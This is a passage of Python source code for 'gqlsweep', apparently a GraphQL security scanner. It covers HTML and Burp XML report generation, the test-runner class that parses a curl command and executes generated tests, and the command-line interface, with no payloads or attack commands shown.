                    const rawResp = document.getElementById('raw-resp-' + id);
                    const checkbox = document.getElementById('toggle-' + id);
                    
                    if (checkbox.checked) {{
                        parsedReq.style.display = 'none';
                        rawReq.style.display = 'block';
                        parsedResp.style.display = 'none';
                        rawResp.style.display = 'block';
                    }} else {{
                        parsedReq.style.display = 'block';
                        rawReq.style.display = 'none';
                        parsedResp.style.display = 'block';
                        rawResp.style.display = 'none';
                    }}
                }}
            </script>
        </head>
        <body>
            <div class="container">
                <header>
                    <h1>gqlsweep Security Report</h1>
                    <p>Generated by 0xs0m's gqlsweep</p>
                </header>
                
                <div class="summary-bar">
                    <div class="stat-card">
                        <span class="stat-value">{len(tests)}</span>
                        <span class="stat-label">Total Tests</span>
                    </div>
                    <div class="stat-card">
                        <span class="stat-value" style="color:#dc3545">{len(vulns)}</span>
                        <span class="stat-label">Vulnerabilities</span>
                    </div>
                    {''.join([f'<div class="stat-card"><span class="stat-value">{c}</span><span class="stat-label">{s}</span></div>' for s, c in severity_counts.items() if c > 0])}
                </div>

                <div class="vulns-list">
                    { ''.join([ReportGenerator._render_vuln_card(v, i) for i, v in enumerate(vulns)]) }
                </div>
            </div>
        </body>
        </html>
        """
        with open(filename, 'w') as f:
            f.write(template)
        print(f"HTML Report saved to {filename}")

    @staticmethod
    def _render_vuln_card(v: Vulnerability, index: int) -> str:
        # Generate unique ID based on index to avoid safe-character issues with test_id
        uid = f"v{index}"
        
        # Helper to safely get raw content
        raw_resp = v.raw_response if v.raw_response else "No response captured"
        if len(raw_resp) > 5000:
            raw_resp = raw_resp[:5000] + "... (truncated)"
        
        full_raw_req = v.full_raw_request if v.full_raw_request else "Raw request reconstruction failed."
        full_raw_resp = v.full_raw_response if v.full_raw_response else "Raw response reconstruction failed."
        
        variables_json = json.dumps(v.variables, indent=2) if v.variables else "{}"
        
        return f"""
        <div class="vuln-card">
            <div class="vuln-header">
                <h3 class="vuln-title">
                    <span class="badge bg-{v.severity}">{v.severity}</span>
                    {v.name} <small style="color:#6c757d">({v.test_id})</small>
                </h3>
                <div style="display:flex; align-items:center;">
                    <span class="toggle-label">Show Raw</span>
                    <label class="switch">
                        <input type="checkbox" id="toggle-{uid}" onclick="toggleRaw('{uid}')">
                        <span class="slider"></span>
                    </label>
                    <span class="badge bg-secondary" style="background:#6c757d; margin-left:15px;">HTTP {v.http_code}</span>
                </div>
            </div>
            <div class="vuln-body">
                <p>{v.description}</p>
                
                <div class="finding-box">
                    <strong>Finding:</strong> {v.finding}
                </div>

                <div class="details-section">
                    <details open>
                        <summary>Request Details</summary>
                        <div class="content-box">
                            <div id="parsed-req-{uid}">
                                <strong>Query:</strong>
                                <pre class="code-block">{v.query}</pre>
                                <br>
                                <strong>Variables:</strong>
                                <pre class="code-block">{variables_json}</pre>
                            </div>
                            <div id="raw-req-{uid}" class="raw-view">
                                <pre class="code-block">{full_raw_req.replace('<', '&lt;').replace('>', '&gt;')}</pre>
                            </div>
                        </div>
                    </details>
                    
                    <details open>
                        <summary>Response Details ({v.response_time:.3f}s, {v.response_size} bytes)</summary>
                        <div class="content-box">
                            <div id="parsed-resp-{uid}">
                                <pre class="code-block">{raw_resp.replace('<', '&lt;').replace('>', '&gt;')}</pre>
                            </div>
                             <div id="raw-resp-{uid}" class="raw-view">
                                <pre class="code-block">{full_raw_resp.replace('<', '&lt;').replace('>', '&gt;')}</pre>
                            </div>
                        </div>
                    </details>
                </div>
            </div>
        </div>
        """

    @staticmethod
    def to_burp_xml(tests: List[Vulnerability], filename: str):
        xml = "<?xml version=\"1.0\"?>\n<issues>"
        for t in tests:
            if t.finding:
                 xml += f"""
  <issue>
    <serialNumber>{t.test_id}</serialNumber>
    <type>0</type>
    <name>{t.name}</name>
    <host></host>
    <path></path>
    <location></location>
    <severity>{t.severity}</severity>
    <background><![CDATA[{t.description}]]></background>
    <detail><![CDATA[{t.finding}]]></detail>
  </issue>
"""
        xml += "</issues>"
        with open(filename, 'w') as f:
            f.write(xml)
        print(f"Burp XML saved to {filename}")

class GraphQLTester:
    def __init__(self, raw_curl: str, output_json: Optional[str] = None, output_html: Optional[str] = None, output_xml: Optional[str] = None, verbose: bool = False, proxy: Optional[str] = None):
        self.raw_curl = raw_curl
        self.output_json = output_json
        self.output_html = output_html
        self.output_xml = output_xml
        self.verbose = verbose
        
        print(f"{Colors.OKBLUE}Parsing Curl Command...{Colors.ENDC}")
        self.request_config = CurlParser.parse(raw_curl)
        
        # Strip Content-Length as it will vary for each test payload and urllib handles it
        keys_to_remove = [k for k in self.request_config['headers'] if k.lower() == 'content-length']
        for k in keys_to_remove:
            del self.request_config['headers'][k]
        
        if proxy:
            self.request_config['proxy'] = proxy
        
        self.executor = Executor(
            endpoint=self.request_config['url'],
            headers=self.request_config['headers'],
            proxy=self.request_config['proxy']
        )
        self.introspector = SchemaIntrospector(self.executor)
        self.original_payload = CurlParser.extract_graphql_payload(self.request_config.get('data', ''))
        self.generator = TestCaseGenerator(self.introspector, self.original_payload.get('query') if self.original_payload else None)

    def run(self):
        print(BANNER)
        print(f"Target: {self.request_config['url']}")
        
        self.introspector.introspect()
        
        print(f"\nGenerating Test Cases...")
        tests = self.generator.generate_all()
        print(f"Generated {len(tests)} tests.")
        
        print(f"\nStarting Execution...")
        results = self.executor.run_batch(tests, self.verbose)
        
        vulns = [r for r in results if r.finding]
        print(f"\n=== TEST SUMMARY ===")
        print(f"Total Tests: {len(results)}")
        print(f"Vulnerabilities Found: {len(vulns)}")
        
        if vulns:
            print(f"\n=== DETAILED FINDINGS ===")
            for v in vulns:
                print(f"\n[{v.severity}] {v.name}")
                print(f"  ID: {v.test_id}")
                print(f"  Finding: {v.finding}")
                print(f"  Description: {v.description}")
        
        if self.output_json:
            ReportGenerator.to_json(results, self.output_json)
        if self.output_html:
            ReportGenerator.to_html(results, self.output_html)
        if self.output_xml:
            ReportGenerator.to_burp_xml(results, self.output_xml)

def main():
    parser = argparse.ArgumentParser(description='gqlsweep - GraphQL Security Testing Tool by 0xs0m', formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument('-c', '--curl', help='Curl command (wrapped in quotes)')

    parser.add_argument('-r', '--request-file', help='File containing curl command')
    parser.add_argument('-o', '--output', help='Output JSON file')
    parser.add_argument('--html', help='Output HTML report')
    parser.add_argument('--xml', help='Output Burp Suite XML')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output (print responses)')
    parser.add_argument('-x', '--proxy', help='Proxy URL (e.g. http://127.0.0.1:8080)')
    
    args = parser.parse_args()
    
    curl_cmd = ""
    if args.request_file:
        try:
            with open(args.request_file, 'r') as f:
                curl_cmd = f.read().strip()
        except FileNotFoundError:
            print(f"{Colors.FAIL}File not found!{Colors.ENDC}")
            sys.exit(1)
    elif args.curl:
        curl_cmd = args.curl
    else:
        print(BANNER)
        parser.print_help()
        sys.exit(1)
        
    try:
        tester = GraphQLTester(curl_cmd, args.output, args.html, args.xml, args.verbose, args.proxy)
        tester.run()
    except Exception as e:
        print(f"\n{Colors.FAIL}[CRITICAL ERROR] {e}{Colors.ENDC}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
